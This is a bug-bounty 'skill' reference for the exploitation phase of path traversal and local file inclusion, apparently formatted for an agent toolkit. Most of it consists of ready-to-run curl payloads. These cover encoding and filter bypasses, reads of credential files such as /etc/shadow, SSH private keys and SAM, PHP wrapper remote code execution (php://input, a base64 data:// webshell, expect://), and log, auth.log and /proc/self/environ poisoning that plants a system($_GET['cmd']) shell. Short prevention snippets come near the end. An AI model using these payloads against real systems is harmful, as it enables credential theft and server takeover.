---
name: "path-traversal"
version: "2.0"
category: "injection"
subcategory: "path-traversal"
phase: "exploitation"
tags: ["bug-bounty", "injection", "path-traversal", "lfi", "directory-traversal", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["ffuf", "burp-intruder", "seclists", "dotdotpwn", "arjun", "authz", "autorize", "burp", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["lfi", "rce", "local-file-inclusion", "remote-code-execution"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: path traversal - exploitation phase, injection category"
---
# File Path Traversal

## Summary

Path traversal (directory traversal) occurs when user-controllable input is passed to filesystem APIs without proper validation. Attackers use `../` sequences and encoding variants to read arbitrary files (configs, credentials, source code) outside the intended directory, and can escalate to RCE via log poisoning, PHP wrappers, or file upload chaining.

## Key Concepts

- **Traversal Sequence**: `../` (Linux) or `..\` (Windows) moves up one directory level
- **Canonicalization**: Resolving a path to its absolute form — `realpath()` strips `../` sequences
- **Base Directory Restriction**: Intended directory files should be restricted to (<e.g.>, `/var/www/files/`)
- **PHP Wrappers**: `php://filter`, `php://input`, `data://`, `expect://` — protocol-based file access
- **Log Poisoning**: Injecting PHP code into server logs, then including the log file to execute it
- **Double Encoding**: `%252f` decodes to `%2f` after first decode, then to `/` after second — bypasses single-decode filters

## Technical Details

### Root Causes

- Unsanitized user input used in filesystem API calls (`include`, `file_get_contents`, `open`, `readfile`)
- Insufficient path validation — checking prefix but not stripping `../`
- Extension whitelist bypass via null byte injection (`%00`) — legacy PHP < 5.3.4
- WAF/blacklist bypass via encoding variations

### Vulnerable Code Example

```php
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

### PHP Wrappers

| Wrapper | Usage | Effect |
|---------|-------|--------|
| `php://filter/convert.base64-encode/resource=FILE` | Read source code as base64 | Bypasses extension filters |
| `php://input` | Read POST body | Execute POST data as PHP code |
| `data://text/plain;base64,BASE64` | Inline data stream | Execute arbitrary PHP from encoded string |
| `expect://CMD` | Execute command | RCE (if expect module installed) |
| `phar://` | PHAR archive deserialization | Trigger deserialization (see Insecure Deserialization) |

### High-Value Linux Target Files

```
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (root only)
/etc/group               # Group information
/etc/hosts               # Host mappings
/etc/hostname            # System hostname
/etc/ssh/sshd_config     # SSH configuration
/root/.ssh/id_rsa        # Root private key
/root/.ssh/authorized_keys
/home/<user>/.ssh/id_rsa # User private keys
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/proc/self/environ       # Environment variables
/proc/self/cmdline       # Process command line
/proc/self/fd/0          # File descriptors
/proc/version            # Kernel version
/etc/mysql/my.cnf
/etc/postgresql/*/postgresql.conf
/opt/lampp/etc/httpd.conf
```

### High-Value Windows Target Files

```
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM
C:\windows\repair\SAM
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\phpmyadmin\config.inc.php
C:\Users\<user>\.ssh\id_rsa
```

## Methodology

1. Map all file-related parameters across the application — check for `file`, `path`, `page`, `template`, `filename`, `doc`, `document`, `folder`, `dir`, `include`, `src`, `source`, `content`, `view`, `download`, `load`, `read`, `retrieve` in URLs, POST bodies, cookies, and headers.
2. Identify common vulnerable functionality: image loading (`/image?filename=23.jpg`), template selection (`?template=blue.php`), file downloads (`/download?file=report.pdf`), document viewers (`/view?doc=manual.pdf`), include mechanisms (`?page=about`).
3. Test basic traversal — send `../../../etc/passwd` (Linux) or `..\..\..\windows\win.ini` (Windows) and observe the response.
4. Test absolute path injection — send `/etc/passwd` or `C:\windows\win.ini` directly.
5. If basic traversal is blocked, test encoding variants — URL encoding (`%2e%2e%2f`), double encoding (`%252e%252e%252f`), Unicode overlong (`%c0%af`), mixed encoding (`..%2f..%2f`).
6. If `../` is stripped, test nested bypasses — `....//....//` (inner `../` reconstructed after strip), `..././`, `..;/`.
7. Test bypass techniques for extension validation — null byte (`%00.jpg`), path truncation, double extension, parameter pollution.
8. If traversal is confirmed but direct file reading fails, try PHP wrappers — `php://filter/convert.base64-encode/resource=config.php` to read source code.
9. Attempt RCE escalation — log poisoning (inject PHP via User-Agent, then include `access.log` or `auth.log`), `php://input`, `data://` wrapper, `expect://`.
10. Automate testing — use ffuf, wfuzz, or Burp Intruder with traversal wordlists.

## Detection Commands

### Basic traversal
```bash
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=../../../etc/passwd"
```

### URL-encoded traversal
```bash
curl "http://target.com/image?filename=..%2F..%2F..%2Fetc%2Fpasswd"
curl "http://target.com/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

### Double-encoded traversal
```bash
curl "http://target.com/image?filename=..%252f..%252f..%252fetc%252fpasswd"
```

### Nested bypass (stripped sequences)
```bash
curl "http://target.com/image?filename=....//....//....//etc/passwd"
curl "http://target.com/image?filename=..././..././..././etc/passwd"
```

### Null byte injection
```bash
curl "http://target.com/image?filename=../../../etc/passwd%00.jpg"
```

### Absolute path
```bash
curl "http://target.com/image?filename=/etc/passwd"
curl "http://target.com/download?file=C:\\windows\\win.ini"
```

### PHP filter wrapper (read source as base64)
```bash
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
```

### PHP input wrapper (POST data executed)
```bash
curl -X POST -d "<?php system('id'); ?>" \
  "http://target.com/page?file=php://input"
```

### data:// wrapper
```bash
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
```

### expect:// wrapper
```bash
curl "http://target.com/page?file=expect://id"
```

### Automated fuzzing with ffuf
```bash
ffuf -u "http://target.com/image?filename=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200
```

### Automated fuzzing with wfuzz
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  --hc 404 "http://target.com/index.php?file=FUZZ"
```

## Exploitation Payloads

### Log poisoning to RCE
```bash
# Step 1: Inject PHP code into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the log file
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"
```

### SSH auth.log poisoning
```bash
# Step 1: Inject via SSH (looks like failed login)
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 2: Include auth.log
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

### Proc/self/environ poisoning
```bash
curl -A "<?php system(\$_GET['c']); ?>" \
  "http://target.com/page?file=/proc/self/environ&c=whoami"
```

## Commands

### php://filter wrapper variations
```bash
# Read common app files
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=../../wp-config.php
php://filter/convert.base64-encode/resource=/etc/passwd

# Convert with rot13 first
php://filter/read=convert.base64-encode|string.rot13/resource=index.php

# Multiple chained filters
php://filter/convert.base64-encode|convert.base64-encode/resource=index.php
```

### Decode base64 output
```bash
curl -s "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

## Tools

- **Burp Suite** — Repeater, Intruder (with traversal wordlists)
- **ffuf** — Fast path traversal fuzzing
- **wfuzz** — Parameter fuzzing for traversal
- **cURL** — Manual payload testing
- **SecLists** — LFI/LFI-Jhaddix.txt traversal wordlist

## Bypass Techniques

- **URL Encoding**: `%2e%2e%2f`, `..%2f`, `%2e%2e/`
- **Double Encoding**: `%252e%252e%252f` (decoded twice by server)
- **Unicode Overlong**: `%c0%af` (decodes to `/`), `%c0%2e%c0%2e%c0%af`
- **Nested Traversal**: `....//....//` (inner `../` reconstructs after strip), `..././`
- **Semicolon Injection**: `..;/..;/..;/etc/passwd`
- **Null Byte Injection**: `%00.jpg`, `%00.png` (PHP < 5.3.4)
- **Absolute Path**: Bypasses relative path filters
- **Mixed Encoding**: Combine URL encoding, double encoding, and plaintext in one payload
- **Case Variations** (Windows only): `..\\..\\..\\windows\\win.ini`, `....\\....\\etc\\passwd`
- **Parameter Pollution**: `file=allowed.txt&file=../../../etc/passwd`
- **Base Directory Prefix**: `/var/www/images/../../../etc/passwd` (starts with allowed path)
- **Path Truncation**: `../../../etc/passwd...............................` (max path length truncation)

## Not a Finding If

- The application uses `basename()` or equivalent to strip path components before filesystem access
- Path is canonicalized with `realpath()` and validated to start with the base directory
- A strict whitelist of allowed filenames is enforced server-side
- PHP wrappers are blocked (php://, data://, expect:// are disabled)
- All encoding variants return the same error/page as valid input does
- Response times are identical for valid and invalid traversal attempts (no timing side-channel)

## Notes

- Always test both forward slashes `../` and backslashes `..\` regardless of server OS — many app servers normalize to the native format
- PHP wrappers are the highest-impact path traversal vector — `php://filter` reads source code, `php://input` and `data://` give RCE
- Log poisoning works when the application includes log files AND the log contains attacker-controlled data (User-Agent, Referer, etc.)
- Proc/self/environ poisoning is less reliable on hardened systems where `proc` is restricted
- Double encoding exploits the server decoding input before passing to the filesystem API — WAFs may only check the once-decoded value
- Null byte injection only works on PHP < 5.3.4 — rare today but worth testing
- Windows is case-insensitive for paths but case-preserving — `..\\..\\..\\windows\\win.ini` works the same as `..\\..\\..\\WINDOWS\\WIN.INI`

## Prevention

### PHP — basename() whitelist
```php
$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
if (in_array($_GET['file'], $allowed)) {
    include("/var/www/files/" . $_GET['file']);
}
```

### PHP — realpath() canonicalization
```php
$base = "/var/www/files/";
$realBase = realpath($base);
$userPath = $base . $_GET['file'];
$realUserPath = realpath($userPath);
if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
    include($realUserPath);
}
```

### Python — os.path.realpath() validation
```python
import os

def safe_file_access(base_dir, filename):
    base = os.path.realpath(base_dir)
    file_path = os.path.realpath(os.path.join(base, filename))
    if file_path.startswith(base):
        return open(file_path, 'r').read()
    else:
        raise Exception("Access denied")
```

## Quick Reference

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows INI file |
| `....//....//....//etc/passwd` | Bypass simple filter |
| `/etc/passwd` | Absolute path |
| `php://filter/convert.base64-encode/resource=config.php` | Source code read |

### Encoding Variants

| Type | Example |
|------|---------|
| URL Encoding | `%2e%2e%2f` = `../` |
| Double Encoding | `%252e%252e%252f` = `../` |
| Unicode Overlong | `%c0%af` = `/` |
| Null Byte | `%00` |

## Constraints and Limitations

- Cannot read files the application user cannot access
- `/etc/shadow` requires root privileges
- Extension validation may limit file types
- Base path validation may restrict scope
- WAF may block common payloads
- Respect authorized scope — avoid accessing genuinely sensitive data

## Troubleshooting

| Problem | Solutions |
|---------|-----------|
| No response difference | Try encoding, blind traversal, different files |
| Payload blocked | Use encoding variants, nested sequences, case variations |
| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |

## References

- https://portswigger.net/web-security/file-path-traversal
- https://owasp.org/www-community/attacks/Path_Traversal
- https://book.hacktricks.xyz/pentesting-web/file-inclusion
